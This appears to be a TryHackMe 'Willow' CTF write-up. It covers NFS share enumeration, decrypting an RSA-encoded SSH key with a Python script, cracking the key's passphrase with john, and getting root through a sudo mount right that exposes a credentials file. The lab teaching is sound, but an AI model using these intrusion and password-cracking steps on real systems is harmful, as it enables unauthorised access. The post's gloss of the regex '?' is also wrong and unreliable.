# Willow

## Introduction:

Welcome to my another writeup! In this TryHackMe [Willow](https://tryhackme.com/room/willow) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> What lies under the Willow Tree?

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege Escalation: Easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# export RHOSTS=10.10.61.18 
                                                                                                                      
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
Open 10.10.61.18:22
Open 10.10.61.18:80
Open 10.10.61.18:111
Open 10.10.61.18:2049
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[!] Error Exit code = 11
```

I don't know why `rustscan` isn't working, I'll use `nmap`:

**Nmap:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# nmap -sT -T4 -sC -sV -p22,80,111,2049 $RHOSTS
[...]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Recovery Page
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36702/tcp   mountd
|   100005  1,2,3      37880/tcp6  mountd
|   100005  1,2,3      38034/udp6  mountd
|   100005  1,2,3      49801/udp   mountd
|   100021  1,3,4      38261/udp6  nlockmgr
|   100021  1,3,4      47593/tcp6  nlockmgr
|   100021  1,3,4      55085/tcp   nlockmgr
|   100021  1,3,4      58213/udp   nlockmgr
|   100024  1          47687/udp6  status
|   100024  1          49857/udp   status
|   100024  1          56638/tcp   status
|   100024  1          59986/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` and `nmap` result, we have 4 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 6.7p1 Debian
80                | Apache 2.4.10
111               | RPCbind
2049              | NFS

## NFS on Port 2049

Let's enumerate NFS first!

To list all shared mounts in the target machine, I'll use `showmount`:

**Shared mount:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# showmount -e $RHOSTS                  
Export list for 10.10.61.18:
/var/failsafe *
```

Found `/var/failsafe` share. Next, we can `mount` the share:

**Mounting the share:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# mkdir share                  
                                                                                                                      
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# mount $RHOSTS:/var/failsafe ./share
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# ls -lah ./share 
total 12K
drwxr--r-- 2 nobody nogroup 4.0K Jan 30  2020 .
drwxr-xr-x 4 root   root    4.0K Sep  1 08:56 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat ./share/rsa_keys 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

Found file `rsa_keys`, I'm not sure what we can do with it at the moment. Let's enumerate the HTTP port.

## HTTP on Port 80

**/index.html:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Willow/images/a1.png)

What the hell is this lul? It looks like it's encoded as hex, let's decode that:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat index.hex | xxd -r -p > decoded_index.txt
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 16186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367 2367 2367 14422 26842 9450 14605 19276 2367 11339 33006 36500 4198 33781 33029 11405 5267 8600 1735 17632 16186 31131 26842 11339 8600 35734 14422 35734 8600 35670 2367 18410 35243 37438 14605 33781 33029 37248 8600 28374 2367 22149 27582 3078 2367 17632 9709 17632 5267 27582 8600 27582 23721 11405 13256 33985 37248 18278 33985 27582 26775 23721 26775 27582 22149 3078 3078 9709 11405 33985 18278 17632 37248 37248 33443 8600 18278 18278 27582 18330 13256 14422 14422 28061 10386 23219 10386 3339 25111 22053 21889 31131 33856 3339 16186 28061 7496 14605 22149 5851 35243 11339 33985 35243 22872 33443 33856 33443 22149 33856 8452 11339 7568 22053 22149 3947 29609 9709 35243 5851 11405 18199 13256 33215 33985 7568 33215 12244 5444 22053 14605 10386 7496 33215 3339 9709 10386 21889 8452 28061 28374 8499 12792 18199 20172 19276 8499 14422 22102 19396 12244 28061 23721 8452 27582 5851 19276 28374 12244 23721 26775 28374 18199 35243 13256 28927 23219 35243 35734 3339 33215 3339 22149 36500 14605 21404 27582 1735 35243 28638 12792 7496 27582 28061 33856 33856 28927 7568 11339 37438 37438 8452 3078 28374 28638 3339 9709 28927 28638 35243 19276 35734 4198 7914 18278 8600 37248 9709 18199 19276 20172 22149 14422 5444 11339 7496 12792 28638 7568 18199 29655 35243 21889 18199 12792 20172 31131 21404 20172 37248 33443 [...]
```

Found username `willow`.

Hmm... We now need to decrypt willow's private SSH key.

> Note: There is a [blog](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/) who made by MuirlandOracle explains RSA encryption very detail.

Armed with this information, we can try to decrypt the private SSH key:

**rsa_keys:**
```
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

**Break it down to:**
```
e = 23
d = 61527
n = 37627
```

> Note: If you don't understand what is that, I strongly recommend you to read [MuirlandOracle's blog](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/) that explaining about RSA encryption.

Now we know the public key and private key values, we can encrypt and decrypt the data: 

**Encrypt data:**
```
something^e mod n

Or in python:

something ** e % n
```

**Decrypt data:**
```
something^d mod n

Or in python:

something ** d % n
```

Let's say if we want to **encrypt** the number 96 in `python`:

```py
encrypted = 96 ** 23 % 37627
print(encrypted)

# Output: 13532
```

**Decrypt it:**
```py
decrypted = 13532 ** 61527 % 37627
print(decrypted)

# Output: 96
```

What if we want to **encrypt and decrypt a word**? Let's take "RSA" as an example:

**In ASCII, the word "RSA" is: `82 83 65`**
```py
encrypted = 82 ** 23 % 37627
print(encrypted)

# Output: 16186

encrypted = 83 ** 23 % 37627
print(encrypted)

# Output: 28374

encrypted = 65 ** 23 % 37627
print(encrypted)

# Output: 37248
```

We got: `16186 28374 37248`

**Decrypt it to ASCII:**
```py
decrypted = 16186 ** 61527 % 37627
print(decrypted)

# Output: 82

decrypted = 28374 ** 61527 % 37627
print(decrypted)

# Output: 83

decrypted = 37248 ** 61527 % 37627
print(decrypted)

# Output: 65
```

So, we now can decrypt the private SSH key!

First, let's cleanup the `decoded_index.txt` file:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat decoded_index.txt 
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 16186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367 2367 2367 14422 26842 9450 14605 19276 2367 11339 33006 36500 4198 33781 33029 11405 5267 8600 1735 17632 16186 31131 26842 11339 8600 35734 14422 35734 8600 35670 2367 18410 35243 37438 14605 33781 33029 37248 8600 28374 2367 22149 27582 3078 2367 17632 9709 17632 5267 27582 8600 27582 23721 11405 13256 33985 37248 18278 33985 27582 26775 23721 26775 27582 22149 3078 3078 9709 11405 33985 18278 17632 37248 37248 33443 8600 18278 18278 27582 18330 13256 14422 14422 28061 10386 23219 10386 3339 25111 22053 21889 31131 33856 3339 16186 28061 7496 14605 22149 5851 35243 11339 33985 35243 22872 33443 33856 33443 22149 33856 8452 11339 7568 22053 22149 3947 29609 9709 35243 5851 11405 18199 13256 33215 33985 7568 33215 12244 5444 22053 14605 10386 7496 33215 3339 9709 10386 21889 8452 28061 28374 8499 12792 18199 20172 19276 8499 14422 22102 19396 12244 28061 23721 8452 27582 5851 19276 28374 12244 23721 26775 28374 18199 35243 13256 28927 23219 35243 35734 3339 33215 3339 22149 36500 14605 21404 27582 1735 35243 28638 12792 7496 27582 28061 33856 33856 28927 7568 11339 37438 37438 8452 3078 28374 28638 3339 9709 28927 28638 35243 19276 35734 [...]
```

Next, I'll write a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Willow/rsa_decryption.py) to decrypt it:

**rsa_decryption.py:**
```py
#!/usr/bin/env python3

# Full decryption key values from file rsa_keys
d = 61527
n = 37627

f = open("decoded_index.txt", "r")
file = f.read()

for each_item in file.split():
	# For each encrypted text in decoded_index.txt will be decrypted, and turn ASCII to text via chr().
	decrypted = chr(int(each_item) ** d % n)

	# Append those decrypted text into decypted_private_key.txt
	with open("decypted_private_key.txt", "a") as handler:
		handler.write(str(decrypted))
```

**decypted_private_key.txt:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# python3 decryption.py

┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat decypted_private_key.txt
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
{Redacted}
-----END RSA PRIVATE KEY-----
```

Boom! We got willow's private SSH key! Let's SSH into willow!

# Initial Foothold

**SSH into willow via the decrypted SSH private key:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cp decypted_private_key.txt willow_id_rsa
                                                                                                                      
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# chmod 600 willow_id_rsa

┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# ssh -i willow_id_rsa willow@$RHOSTS
[...]
Enter passphrase for key 'willow_id_rsa': 
```

Ops. It has a passphrase for the private SSH key. Let's crack it via `ssh2john` and `john`:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# ssh2john willow_id_rsa > willow.hash
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt willow.hash 
[...]
{Redacted}       (willow_id_rsa)     
```

**SSH into willow again!**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# ssh -i willow_id_rsa willow@$RHOSTS                       
Enter passphrase for key 'willow_id_rsa': 
sign_and_send_pubkey: no mutual signature supported
```

Hmm... I googled about this error, and this is happening is because we didn't offer the RSA algorithm. To fix this issue, I'll use `-o 'PubkeyAcceptedKeyTypes +ssh-rsa'` in `ssh`:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# ssh -i willow_id_rsa willow@$RHOSTS -o 'PubkeyAcceptedKeyTypes +ssh-rsa'
Enter passphrase for key 'willow_id_rsa': 




	"O take me in your arms, love
	For keen doth the wind blow
	O take me in your arms, love
	For bitter is my deep woe."
		 -The Willow Tree, English Folksong




willow@willow-tree:~$ whoami;hostname;id;ip a
willow
willow-tree
uid=1000(willow) gid=1000(willow) groups=1000(willow),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:a7:6d:8f:85:79 brd ff:ff:ff:ff:ff:ff
    inet 10.10.220.10/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a7:6dff:fe8f:8579/64 scope link 
       valid_lft forever preferred_lft forever
```

And we're finally in!

In the home directory of user `willow`, it has a `user.jpg` image file:

```
willow@willow-tree:~$ ls -lah
[...]
-rw-r--r--  1 willow willow  13K Jan 30  2020 user.jpg
willow@willow-tree:~$ file user.jpg 
user.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 885x127, frames 3
```

Let's transfer this file via `base64`!

```
willow@willow-tree:~$ base64 user.jpg 
/9j/4AAQSkZJRgABAQEBLAEsAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcU
FhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgo
KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAB/A3UDASIA
AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA
AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3
[...]
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# nano user.b64         
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# base64 -d user.b64 > user.jpg      
```

I'll use `tesseract` to convert image's text to text:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# tesseract -l eng user.jpg user_output
```

**user.txt:**
```                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat user_output.txt 
THM{Redacted}
```

# Privilege Escalation

## willow to root

**Sudo Permission:**
```
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

In `sudo` permission, we can see that we're able to mount anything in `/dev/`.

Let's look at `/dev/` directory to see if there are something's odd:

```
willow@willow-tree:/dev$ ls -lah
[...]
brw-rw----   1 root disk    202,   5 Sep  2 13:02 hidden_backup
[...]
```

`hidden_backup`?? That's definitely not default in Linux. Let's mount that directory in `/tmp/`:

```
willow@willow-tree:/tmp$ mkdir share

willow@willow-tree:/tmp$ sudo /bin/mount /dev/hidden_backup /tmp/share
willow@willow-tree:/tmp$ ls -lah /tmp/share/
[...]
-rw-r--r--  1 root root   42 Jan 30  2020 creds.txt

willow@willow-tree:/tmp$ cat /tmp/share/creds.txt 
root:{Redacted}
willow:{Redacted}
```

Ahh! We found root's credentials! Let's **Switch User** to `root`:

```
willow@willow-tree:/tmp$ su root
Password: 
root@willow-tree:/tmp# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

We're root! :D

# Rooted

```
root@willow-tree:/tmp# cat /root/root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

Nice trick lul. Now, **`grep`** and **regular expression** comes in handy!

```
root@willow-tree:/# grep -orE "THM{.*?}"
```

- `.` means: Matches any character.
- `*` means: Matches zero or more instances of the preceding character.
- `?` means: Matches the end of the line.

But no luck...

Maybe it's a steganography thing?? Since we have the `user.jpg` image file. Let's use `steghide` to see is there any shenanigan:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# steghide extract -sf user.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Yep, it is, and I need a passphrase... I guess it's the **root's password** right?

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# steghide extract -sf user.jpg
Enter passphrase: 
wrote extracted data to "root.txt".
```

Nice!

**root.txt:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Willow]
└─# cat root.txt       
THM{Redacted}
```

# Conclusion

What we've learned:

1. Mounting NFS Share
2. RSA Encryption & Decryption
3. Cracking Private SSH Key's Passphrase
4. Privilege Escalation via Credentials File in `/dev/` and Mount it Via `sudo`
5. Steganography